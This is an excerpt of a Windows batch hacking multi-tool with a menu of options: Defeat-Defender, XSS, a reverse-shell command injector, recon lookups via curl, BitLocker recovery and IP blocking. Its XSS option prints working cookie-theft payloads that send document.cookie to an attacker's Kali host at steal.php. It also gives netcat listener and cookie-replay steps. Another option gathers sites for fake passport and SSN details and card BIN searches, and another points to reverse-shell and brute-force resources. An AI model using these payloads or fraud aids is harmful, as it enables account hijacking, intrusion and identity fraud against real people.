...
echo 34) Option 34 (Defeat-Defender)
echo 35) Option 35 (XSS)
echo 36) Option 36 (Mamp mysql issue fix)
echo 37) Option 37 (Reverses shell OS command Injector)
echo 38) Option 38 (ip generator)
echo 39) Option 39 (Unlock Bit locker drive)
echo 40) Option 40 (Exit)
echo -
...
if "%op%"=="34" goto Defeat-Defender
if "%op%"=="35" goto xss
if "%op%"=="36" goto mamp_fixed
if "%op%"=="37" goto oscmd
if "%op%"=="38" goto ip_gen
if "%op%"=="39" goto bit
if "%op%"=="40" goto opExi
...
REM Get-NetTCPConnection| Select LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess , @{n="ProcessName";e={(Get-Process -Id $_.OwningProcess).ProcessName}} , @{n="UserName";e={(Get-Process -Id $_.OwningProcess -IncludeUserName).UserName}}| Where {$_.State -eq"Established"} |FT -autosize -Force 
...
start "" https://www.ip2location.com/demo/ && start "" https://www.bulkseotools.com/bulk-ip-to-location.php && start "" https://www.infobyip.com/ipbulklookup.php
...
echo 6) Option 6 (IP-Multi-Tool v1.8.0.2) [Coded by DSTAT. Instagram: @DDoS_Filter]
...
if "%op%"=="6" goto IP-Multi-Tool_v1.8.0.2
if "%op%"=="7" goto op-exit
if "%op%"=="" goto beginn
...
:ping
set success=false
for /F "tokens=%tokens% delims=<>= " %%i in ('ping -n 1 %ip% ^| find "time="') do (
    set responsetime=%%i
...
echo .
echo  Blocker Tool                                                                                                                                                                            -- Created by Himel Sarkar, insta id: himelsarkar137

echo =============
echo Select a task:
echo =============
echo -
echo 1 ) Option 1  (Write ips)
echo 2 ) Option 2  (Show blocked ips)
echo 3 ) Option 3  (Delet ips)
echo 4 ) Option 4  (Block ips)                         4              
echo 5 ) Option 5  (Write ports)                       
echo 6 ) Option 6  (Show blocked ports)               
echo 7 ) Option 7  (Delet ports)                      
echo 8 ) Option 8  (Block Ports)                       8
...
echo .                              46.165.193.67                              .
echo .                              46.165.222.212                             . 
echo                                192.168.0.50-192.168.0.70                  .
echo                                157.60.0.1,172.16.0.0/16                   .
echo ...........................................................................
...
cls
SET /P ip=Enter your target IP/domainame.com: 
...
echo ========================================================= Hackertarget hostsearch ==============================================================
curl -s https://api.hackertarget.com/hostsearch/?q=%ip% | sort
goto op7
)
if %choice%==14 (
...
start http://iknowwhatyoudownload.com/en/peer/?ip=%ip% & start "" http://geotraceroute.com/new.php?host=%ip% & start "" http://www.abuseipdb.com/check/%ip% & start "" http://search.yahoo.com/search?p=%ip% & start "" https://yandex.com/search/?text=%ip% & start "" https://duckduckgo.com/?q=%ip% & start "" http://www.iplocation.net/?query=%ip% & start"" http://www.zoomeye.org/searchResult?q=%ip% & start "" http://spyse.com/target/ip/%ip% & start "" http://www.shodan.io/host/%ip% & start "" http://viz.greynoise.io/ip/%ip% & start "" https://www.robtex.com/ip-lookup/%ip% & start "" http://www.scamadviser.com/check-website/%ip% & start "" http://hackertarget.com/reverse-ip-lookup/%ip% & start "" http://pentest-tools.com/website-vulnerability-scanning/website-scanner?url=%ip% & start "" https://ip8.com/?url=%ip% & start "" https://bgpview.io/ip/%ip% & start "" http://censys.io/ipv4?q=%ip% & start "" https://toolbar.netcraft.com/site_report?url=%ip% & start "" https://www.robtex.com/dns-lookup/%ip% & start "" https://crt.sh/?q=%ip%

cls
echo Please be patient...................... It will take some time for retrieving domain report 
echo ========================================================= Hackertarget hostsearch ==============================================================
curl -s https://api.hackertarget.com/hostsearch/?q=%ip% | sort >> Hackertarget_hostsearch%random%.txt 

echo ========================================================= Threatcrowd domain report ==============================================================

curl -s https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=%ip% >>Threatcrowd_domain_report%random%.txt

echo ========================================================= Bufferover =========================================================================
curl -s "https://dns.bufferover.run/dns?q=.%ip% >>Bufferover%random%.txt

echo ========================================== Web Archive =======================================================================
curl -s "http://web.archive.org/cdx/search/cdx?url=*.%ip%/*&output=text&fl=original&collapse=urlkey" >> Web_Archive%random%.txt
echo ========================================================= dns_names and issuer and expire Date ==============================================================
curl -s https://api.certspotter.com/v1/issuances?domain=%ip%"&"expand=dns_names"&"expand=issuer >> dns_names_and_issuer_and_expire_Date%random%.txt
cls
echo task 100% compleated and Generated 
...
echo 8)  Option  8(Valid fake info)-[for servey sites]{passport,ssn}
...
goto s-m-c
:sp8
start "" https://www.yellowpages.com/ && start "" https://www.bestrandoms.com/random-identity && start "" http://www.datafakegenerator.com/generador.php && start "" http://www.fakeaddressgenerator.com/ && start ""  http://www.elfqrin.com/ && start "" http://www.ssnvalidator.com/ && start "" http://www.ssnregistry.org/validate && start "" http://www.homes.com/ && start "" http://thispersondoesnotexist.com/ && start ""  https://centralshop.cn/ru/#/cards/bin/search && start ""  https://www.bincodes.com/bin-search/
...
TASKKILL /F /IM MusNotifyIcon.exe /T
TASKKILL /F /IM PresentationFontCache.exe /T
...
if %choice%==15 (
start brave --incognito --tor https://coursedrive.org/?s=%search%
...
start brave --incognito --tor https://webcourses.us/?s=%search%
...
start brave --incognito --tor https://torlook.info/%search%
...
start "" https://www.baidu.com/s?ie=utf-8"&"wd=%search%

start "" https://www.qwant.com/?q=%search%"&"t=web
...
echo Welcome,
echo Choose an option from a below list.
echo -16. Bulk revshells, password list generator (For revshells,Brute Force)
...
start "" https://www.google.co.in/search?q=my-gitbooks%2Fred-teaming%2F
REM curl -s "http://web.archive.org/cdx/search/cdx?url=*.hackme.com/*&output=text&fl=original&collapse=urlkey" |sort
REM Get Subdomains from RapidDNS.io    
REM curl -s "https://rapiddns.io/subdomain/bbc.com?full=1#result" | find "<td><a" |sort
REM Get Subdomains from BufferOver.run
REM curl -s "https://dns.bufferover.run/dns?q=.bbc.com" | sort
goto vu
)

if %choice%==-16 (
cls
start "" https://www.revshells.com/
...
start brave --incognito --tor https://kalilinuxtutorials.com/?s=%v%
start brave --incognito --tor https://pentesttools.net/?s=%v%
start brave --incognito --tor https://geekychild.com/?s=%v%
start brave --incognito --tor https://guide.offsecnewbie.com/?q=%v%
...
start brave --incognito --tor https://yandex.ua/search/?text=site:highon.coffee%%20%v%
...
start "" https://geekychild.com/?s=%v%
start "" https://pentesttools.net/?s=%v%
start "" https://kalilinuxtutorials.com/?s=%v%
...
echo -------------------------------------------------
powershell -c "Start-Process -FilePath "${env:Windir}\System32\SFC.EXE" -ArgumentList '/scannow' -Wait -Verb RunAs
...
color 0a
echo.
echo ^(nc -lvp 80^) , install Firefox addon ^(Cookie-Editor^), goto about^:config ^> "security.ssl.enable_ocsp_stapling" make it false,copy-past ssid  to Cookie-Editor 
 
echo.
set /p a="Enter the Kali ip : "
if [%a%]==[] ( 
CALL:error
cls
pause 
...
echo Your  Url is :  %a% 
echo ^(1^)
echo Your Xss Script is: ^<script^>new Image^(^).src^="http://%a%/steal.php?c="+document.cookie^;^<^/script^> 
echo ^(2^)
echo ^<div onmouseover^="new Image().src='http://%a%/steal.php?c='+escape(document.cookie)>
echo ^(3^)

echo ^<iframe src^="http://%a%" frameborder^=0 width^=510 height^=400 scrolling^=no allowfullscreen^=allowfullscreen^>^<^/iframe^>

start "" http://xss-scanner.com/ 
start "" https://xss-game.appspot.com/
echo.
...
setlocal
echo    a:b:c:d
set /p a_in=Type class "a_in" ip:
set /p a=Type class "a" ip:
set /p b_in=Type class "b_in" ip:
set /p b=Type class "b" ip:
set /p c_in=Type class "c_in" ip:
set /p c=Type class "c" ip:
set /p d_in=Type class "d_in" ip:
set /p d=Type class "d" ip:
set startTime=%time%

ECHO Please be patient its working . . .
FOR /L %%a IN (%a_in%,1,%a%) DO @(
rem ECHO Pinging IP Range: %%a.%%b.%%i._
FOR /L %%b IN (%b_in%,1,%b%) DO @(
rem ECHO Pinging IP Range: 192.%%b.%%i._
FOR /L %%i IN (%c_in%,1,%c%) DO @(
rem ECHO Pinging IP Range: 192.168.%%i._
FOR /L %%z IN (%d_in%,1,%d%) DO @(
rem echo %%a.%%b.%%i.%%z >>ip.txt
rem ping -n 1 -w 500 192.%%b.%%i.%%z | FIND /i "Reply" >>ip.txt

rem echo for block
 netsh advfirewall firewall add rule name="Blockit" protocol=any dir=in action=block remoteip=%%a.%%b.%%i.%%z
 netsh advfirewall firewall add rule name="Blockit" protocol=any dir=out action=block remoteip=%%a.%%b.%%i.%%z

rem netsh advfirewall firewall delete rule name="Blockit"

rem echo for bypass
rem netsh advfirewall firewall add rule name="Blockit" protocol=any dir=in action=bypass remoteip=%%a.%%b.%%i.%%z
rem netsh advfirewall firewall add rule name="Blockit" protocol=any dir=out action=bypass remoteip=%%a.%%b.%%i.%%z



rem echo if any error
rem netsh advfirewall firewall show rule name="Blockit" >nul || netsh advfirewall firewall add rule name="Blockit"

rem echo To restore the firewall settings
...
cls
type ip.txt
echo generated ip successfully stored in ip.txt
pause
goto begin
...
COLOR F0
setlocal
set /p drive=Enter locked drive name D:, E:, F:, G:, H:, I: --^> 

manage-bde -protectors -get %drive% 

echo next copy-past "Numerical Password ID only" to ur USB drive save as ^(recoveryFile.txt) click --More Options^>recoverykey^load key frome USB^> unlock
pause>nul
goto begin 

:opExi
Exit
echo you picked option 35
goto begin
:exit
@exit
